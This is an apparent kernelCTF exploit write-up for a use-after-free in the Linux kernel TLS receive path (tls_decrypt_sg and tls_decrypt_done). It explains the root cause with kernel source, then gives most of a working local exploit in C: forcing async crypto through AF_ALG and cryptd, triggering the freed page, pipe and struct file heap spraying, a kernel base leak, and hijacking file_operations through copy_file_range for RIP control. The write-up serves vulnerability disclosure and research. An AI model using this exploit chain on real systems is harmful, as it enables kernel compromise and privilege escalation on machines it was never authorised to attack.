## Root Cause

When zero-copy is not enabled, `tls_decrypt_sg` creates a `clear_skb` [1] to store the decrypted data. The pages of `clear_skb` are then passed to sgout [2].

```c
static int tls_decrypt_sg(struct sock *sk, struct iov_iter *out_iov,
			  struct scatterlist *out_sg,
			  struct tls_decrypt_arg *darg)
{
	// [...]

	if (darg->zc && (out_iov || out_sg)) {
		// [...]
	} else {
		darg->zc = false;

		clear_skb = tls_alloc_clrtxt_skb(sk, skb, rxm->full_len); // [1]
		if (!clear_skb)
			return -ENOMEM;

		n_sgout = 1 + skb_shinfo(clear_skb)->nr_frags;
	}
	// [...]
	if (clear_skb) {
		sg_init_table(sgout, n_sgout);
		sg_set_buf(&sgout[0], dctx->aad, prot->aad_size);

		err = skb_to_sgvec(clear_skb, &sgout[1], prot->prepend_size,
				   data_len + prot->tail_size); // [2]
		if (err < 0)
			goto exit_free;
	} else if (out_iov) {
	// [...]
}
```

After decryption is complete, the pages in sgout are freed in the `tls_decrypt_done` function [3], including the page backing `clear_skb`, even though `clear_skb` itself has not been freed. This leads to a use-after-free condition. If `clear_skb` is later freed, it results in a double free.

```c
static int tls_do_decryption(struct sock *sk,
			     struct scatterlist *sgin,
			     struct scatterlist *sgout,
			     char *iv_recv,
			     size_t data_len,
			     struct aead_request *aead_req,
			     struct tls_decrypt_arg *darg)
{
	// [...]
	if (darg->async) {
		aead_request_set_callback(aead_req,
					  CRYPTO_TFM_REQ_MAY_BACKLOG,
					  tls_decrypt_done, aead_req); // callback
		atomic_inc(&ctx->decrypt_pending);
	} 
    // [...]
}

static void tls_decrypt_done(void *data, int err)
{
	// [...]
	/* Free the destination pages if skb was not decrypted inplace */
	if (sgout != sgin) {
		/* Skip the first S/G entry as it points to AAD */
		for_each_sg(sg_next(sgout), sg, UINT_MAX, pages) {
			if (!sg)
				break;
			put_page(sg_page(sg)); // [3]
		}
	}
	// [...]
}
```

## Exploit Details

Since this is a use-after-free on a page, exploitation is relatively straightforward. To trigger the `tls_decrypt_done` callback, a synchronous request must be issued, which requires the algorithm to be initialized with the `CRYPTO_ALG_ASYNC` flag. In a `kernelCTF` environment, this can be achieved using `cryptd`, an asynchronous crypto module.

```c
static int cryptd_create(struct crypto_template *tmpl, struct rtattr **tb)
{
	struct crypto_attr_type *algt;

	algt = crypto_get_attr_type(tb);
	if (IS_ERR(algt))
		return PTR_ERR(algt);

	switch (algt->type & algt->mask & CRYPTO_ALG_TYPE_MASK) {
	case CRYPTO_ALG_TYPE_SKCIPHER:
		return cryptd_create_skcipher(tmpl, tb, algt, &queue);
	case CRYPTO_ALG_TYPE_HASH:
		return cryptd_create_hash(tmpl, tb, algt, &queue);
	case CRYPTO_ALG_TYPE_AEAD:
		return cryptd_create_aead(tmpl, tb, algt, &queue);
	}

	return -EINVAL;
}

static struct crypto_template cryptd_tmpl = {
	.name = "cryptd",
	.create = cryptd_create,
	.module = THIS_MODULE,
};

static int cryptd_create_aead(struct crypto_template *tmpl,
		              struct rtattr **tb,
			      struct crypto_attr_type *algt,
			      struct cryptd_queue *queue)
{
	// [...]
	inst->alg.base.cra_flags |= CRYPTO_ALG_ASYNC |
		(alg->base.cra_flags & CRYPTO_ALG_INTERNAL);
	// [...]
}
```

Use `AF_ALG` to register `cryptd` for the algorithm:

```c
int sock = socket(AF_ALG, SOCK_SEQPACKET, 0);
struct sockaddr_alg sa = {
    .salg_family = AF_ALG,
    .salg_type = "aead",
    .salg_name = "cryptd(ccm(aes))",
};
bind(sock, (struct sockaddr *)&sa, sizeof(sa));
```

After setting up the server and client, triggering a recv leads to the UAF. To prevent a double free, I use a pipe to keep the socket from being fully released and freeing page again. The pipe also gives me control over when the page is freed.

```c
void run_server(int pipe) {
    pin_cpu(1);
    int server_fd, client_fd;
    struct sockaddr_in server_addr, client_addr;
    socklen_t addr_len = sizeof(client_addr);

    if ((server_fd = socket(AF_INET, SOCK_STREAM, 0)) < 0) {
        perror("socket");
        exit(1);
    }

    memset(&server_addr, 0, sizeof(server_addr));
    server_addr.sin_family = AF_INET;
    server_addr.sin_addr.s_addr = INADDR_ANY;
    server_addr.sin_port = htons(PORT);

    if (bind(server_fd, (struct sockaddr *)&server_addr, sizeof(server_addr)) < 0) {
        perror("bind");
        exit(1);
    }

    if (listen(server_fd, 5) < 0) {
        perror("listen");
        exit(1);
    }


    if ((client_fd = accept(server_fd, (struct sockaddr *)&client_addr, &addr_len)) < 0) {
        perror("accept");
        exit(1);
    }

    if (setup_ktls(client_fd, 0) < 0) {
        close(client_fd);
        close(server_fd);
        exit(1);
    }
    char buf[0x20];
    int bytes_received = recv(client_fd, buf, 0x20, 0);
    puts("recv done");
    if (bytes_received > 0) {
    } else {
        perror("recvmsg");
    }
    SYSCHK(read(pipe, buf, 1)); // hold
    puts("close server");
    close(client_fd);
    close(server_fd);
    exit(0);
}

void run_client() {
    sleep(2);

    int sockfd;
    struct sockaddr_in server_addr;

    if ((sockfd = socket(AF_INET, SOCK_STREAM, 0)) < 0) {
        perror("socket");
        exit(1);
    }

    memset(&server_addr, 0, sizeof(server_addr));
    server_addr.sin_family = AF_INET;
    server_addr.sin_port = htons(PORT);
    inet_pton(AF_INET, "127.0.0.1", &server_addr.sin_addr);

    if (connect(sockfd, (struct sockaddr *)&server_addr, sizeof(server_addr)) < 0) {
        perror("connect");
        close(sockfd);
        exit(1);
    }

    if (setup_ktls(sockfd, 1) < 0) {
        close(sockfd);
        exit(1);
    }

    char buf[0x400];

    if (send(sockfd, buf, sizeof(buf), 0) < 0) {
        perror("sendmsg");
    } else {
    }

}
```

Spray pages via the pipe to reclaim the UAF page:

```c
void spray_pipe() {
    char buf[0x1000];
    memset(buf, 'C', sizeof(buf));

    for (int i = 0; i < PIPE_SPRAY_NUM; i++) {
        write(pipe_fd[i][1], buf, sizeof(buf));
        usleep(100);
    }
}
pin_cpu(1);
spray_pipe();
```

After freeing the page again, we spray struct file objects to overwrite it. This results in arbitrary read/write via the pipe, allowing us to tamper with file structures directly:

```c
SYSCHK(write(pipes[1], "A", 1)); // release socket
usleep(50);
int spray_fds[0x80];
char buff[1024] = {};
for (int i = 0; i < sizeof(spray_fds)/4; i++) {
    spray_fds[i] = SYSCHK(open("/tmp/tmp_file", O_RDWR | O_CREAT, 0666));
    SYSCHK(write(spray_fds[i], buff, i));
}
```

Leak:

```c
u64 buf[0x1000/8];
for (int i = 0; i < PIPE_SPRAY_NUM; i++) {
    SYSCHK(read(pipe_fd[i][0], buf, sizeof(buf)));
    for (int j = 0; j < sizeof(buf)/8; j++)
        if (buf[j] == 0x4f801f00000000) { // find flag file
            goto buildrop;
        }
}
for (int i = 0; i < sizeof(spray_fds)/4; i++) {
    SYSCHK(close(spray_fds[i]));
}
puts("retry");
usleep(5000);
system(argv[0]);
exit(0);
buildrop:
memcpy(save_page, buf, sizeof(buf));
close(sock);
heap_base = (buf[6]-0x30) >> 12 << 12;
info("heap_base", heap_base);
kbase = buf[22] - SHMEM_FILE_OPERATIONS; // f->f_op
// [...]
```

RIP control via `copy_file_range`:

```c
SYSCALL_DEFINE6(copy_file_range, int, fd_in, loff_t __user *, off_in,
		int, fd_out, loff_t __user *, off_out,
		size_t, len, unsigned int, flags)
{
	// [...]
	ret = vfs_copy_file_range(f_in.file, pos_in, f_out.file, pos_out, len,
				  flags);
	// [...]
}

ssize_t vfs_copy_file_range(struct file *file_in, loff_t pos_in,
			    struct file *file_out, loff_t pos_out,
			    size_t len, unsigned int flags)
{
	// [...]
	if (!splice && file_out->f_op->copy_file_range) {
		ret = file_out->f_op->copy_file_range(file_in, pos_in,
						      file_out, pos_out,
						      len, flags); // take control RIP
		goto done;
	}
    // [...]
	return ret;
}
```

```c
struct file_operations *fake_fops = rop + idx;
u64 fake_ops_offset = 0x300;
fake_fops->copy_file_range = magic_gadget;
fake_fops->remap_file_range = magic_gadget;
buf[22] = heap_base + fake_ops_offset; // set file->f_op

char tmp[0x1000];
for (int i = 0; i < PIPE_SPRAY_NUM; i++) {
    SYSCHK(write(pipe_fd[i][1], buf, sizeof(buf)));
    SYSCHK(read(pipe_fd[i][0], tmp, sizeof(tmp)));
}

off_t offset_in = 0, offset_out = 22;
copy_file_range(spray_fds[victim_file_idx], &offset_in, spray_fds[rop_id], &offset_out, 22, 0);
_wait();
```